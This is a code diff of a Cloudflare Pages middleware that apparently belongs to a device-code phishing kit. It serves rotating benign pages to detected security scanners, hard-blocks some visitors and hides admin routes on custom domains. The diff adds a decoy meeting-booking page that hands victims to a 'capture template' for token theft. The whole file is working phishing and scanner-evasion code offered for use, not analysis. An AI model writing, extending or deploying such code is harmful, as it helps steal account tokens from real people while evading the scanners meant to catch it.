@@ -1,4 +1,5 @@
 import { isHardBlocked, isScanner, getRotatingPage } from './lib/protection';
+import { generateDecoyHTML } from './lib/decoy-html';
 
 interface Env {
   TOKEN_STORE: KVNamespace;
@@ -10,6 +11,7 @@ const CUSTOM_DOMAIN_ALLOWED: string[] = [
   '/api/token-poll',
   '/api/antibot-token',
   '/api/templates',
+  '/api/schedule/confirm',
 ];
 
 function isPagesDev(hostname: string): boolean {
@@ -23,17 +25,13 @@ export const onRequest: PagesFunction<Env> = async (context) => {
   const hostname = url.hostname;
 
   // --- Custom Domain Isolation ---
-  // If NOT a .pages.dev domain, block admin and management routes
   if (!isPagesDev(hostname)) {
-    // Block /admin entirely
     if (path.startsWith('/admin')) {
       return new Response('<!DOCTYPE html><html><head><title>404</title></head><body><h1>404 Not Found</h1></body></html>', {
         status: 404,
         headers: { 'Content-Type': 'text/html; charset=utf-8' },
       });
     }
-
-    // Block all /api/* routes except the ones needed for device code flow
     if (path.startsWith('/api/')) {
       const allowed = CUSTOM_DOMAIN_ALLOWED.some(r => path.startsWith(r));
       if (!allowed) {
@@ -56,7 +54,6 @@ export const onRequest: PagesFunction<Env> = async (context) => {
   }
 
   const ua = request.headers.get('user-agent') || '';
-  // Cloudflare provides the client IP in cf-connecting-ip header
   const ip = request.headers.get('cf-connecting-ip') || request.headers.get('x-forwarded-for') || '';
 
   // Layer 1 — Hard Block (403)
@@ -67,7 +64,7 @@ export const onRequest: PagesFunction<Env> = async (context) => {
     });
   }
 
-  // Layer 2 — Scanner Safe Pages (200 rotating) — now checks IP ranges too
+  // Layer 2 — Scanner Safe Pages (200 rotating)
   if (isScanner(ua, ip)) {
     const page = getRotatingPage(ua, url.href);
     return new Response(page, {
@@ -79,6 +76,23 @@ export const onRequest: PagesFunction<Env> = async (context) => {
     });
   }
 
-  // Real browser — pass through to SPA
+  // --- Decoy Page Flow ---
+  // For the root path (/), serve the decoy page (booking calendar)
+  // The decoy page handles user interaction, then POSTs to /api/schedule/confirm
+  // which returns the shield-wrapped capture template
+  if (path === '/' || path === '') {
+    // Read the decoy template config from KV (default to bookings-meeting)
+    const decoyType = (await context.env.TOKEN_STORE.get('decoy_template')) || 'bookings-meeting';
+    const decoyHtml = generateDecoyHTML(decoyType);
+    return new Response(decoyHtml, {
+      status: 200,
+      headers: {
+        'Content-Type': 'text/html; charset=utf-8',
+        'Cache-Control': 'no-store, no-cache, must-revalidate',
+      },
+    });
+  }
+
+  // Real browser, non-root path — pass through to SPA (admin, preview, etc.)
   return context.next();
 };
